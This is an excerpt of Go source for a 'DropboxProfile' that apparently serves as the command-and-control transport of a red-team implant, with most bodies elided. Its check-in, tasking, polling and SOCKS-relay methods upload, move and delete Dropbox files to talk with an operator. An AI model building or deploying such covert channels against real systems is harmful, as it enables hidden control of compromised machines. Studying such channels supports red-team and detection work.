...
func (d *DropboxProfile) Checkin(agent *structs.Agent) error {
	...
	if err != nil {
		...
		return fmt.Errorf("dropbox checkin send/poll failed: %w", err)
	}
	var parsed map[string]any
	if err := json.Unmarshal(resp, &parsed); err != nil {
		d.CallbackUUID = agent.PayloadUUID
		return fmt.Errorf("dropbox checkin decode failed: %w", err)
	}
...
func (d *DropboxProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
	...
	if err := json.Unmarshal(resp, &m); err != nil {
		return nil, nil, fmt.Errorf("dropbox get_tasking decode failed: %w", err)
	}
...
func (d *DropboxProfile) sendAndPoll(activeUUID string, msg any, waitFor time.Duration) ([]byte, error) {
	...
	if lastPollErr != nil {
		return nil, fmt.Errorf("no inbound dropbox response: last poll error: %w", lastPollErr)
	}
...
func (d *DropboxProfile) uploadText(remotePath, content string) error {
	req, err := http.NewRequest("POST", dropboxContentAPI+"/files/upload", strings.NewReader(content))
	if err != nil {
		return err
	}
...
func (d *DropboxProfile) deletePath(remotePath string) error {
	...
	if resp.StatusCode != http.StatusOK {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("dropbox delete failed: %s", string(b))
	}
	return nil
}
...
func (d *DropboxProfile) movePath(from, to string) error {
	...
	if resp.StatusCode != http.StatusOK {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("dropbox move failed: %s", string(b))
	}
	return nil
}
